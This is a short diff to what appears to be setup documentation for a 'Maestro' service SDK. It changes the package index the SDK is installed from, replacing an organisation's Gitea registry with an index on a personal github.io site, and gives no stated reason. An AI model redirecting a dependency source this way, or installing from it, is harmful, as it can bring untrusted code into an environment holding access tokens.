@@ -16,7 +16,7 @@ Reinstall them after upgrading the SDK: `python -c "import maestro_sdk.skills as
 
 - URL: <https://maestro.example>, in `MAESTRO_URL`.
 - SDK: `maestro-sdk==<the service's version>` from the index
-  <https://gitea.example/api/packages/owner/pypi/simple>.
+  <https://au12321ua.github.io/maestro/simple>.
 - Token: a personal access token in the file <path>, given as `MAESTRO_TOKEN_FILE`. Never
   print it, log it, commit it or pass it on a command line.
 
